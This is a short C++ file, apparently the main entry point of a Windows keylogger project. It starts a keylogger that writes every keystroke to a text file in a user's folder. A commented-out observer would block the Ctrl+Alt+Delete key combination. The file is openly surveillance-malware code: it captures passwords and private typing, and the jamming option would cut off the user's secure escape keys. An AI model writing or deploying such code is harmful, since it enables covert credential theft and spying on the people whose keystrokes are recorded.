#include <log/Log.hpp>
#include <keyboard/Keylogger.hpp>
#include <keyboard/KeyLogObserver.hpp>
#include <keyboard/JamKeyObserver.hpp>

using namespace Keyboard;
#include <system/Process.hpp>
#include <common/ParseOptions.hpp>
#include <audit/Audit.hpp>

#include <cstdio>
#include <windows.h>

int submain(int argc, char ** argv)
{
	try
	{
		LOG.setIdentity(Common::identity);
		Common::ParseOptions(argc, argv);

		KeyCombination keys;
		keys.push_back(VK_LMENU);
		keys.push_back(VK_LCONTROL);
		keys.push_back(VK_DELETE);

		Keylogger::instance().addObserver(new KeyLogObserver("C:\\Users\\crunch\\keylog.txt"));
		//Keylogger::instance().addObserver(new JamKeyObserver(keys));
		Keylogger::instance().start();
	}
	CATCH_COMMON_EXCEPTION
	CATCH_UNKNOWN_EXCEPTION
	system("pause");
	return EXIT_SUCCESS;
}

INNOCENCE_MAIN
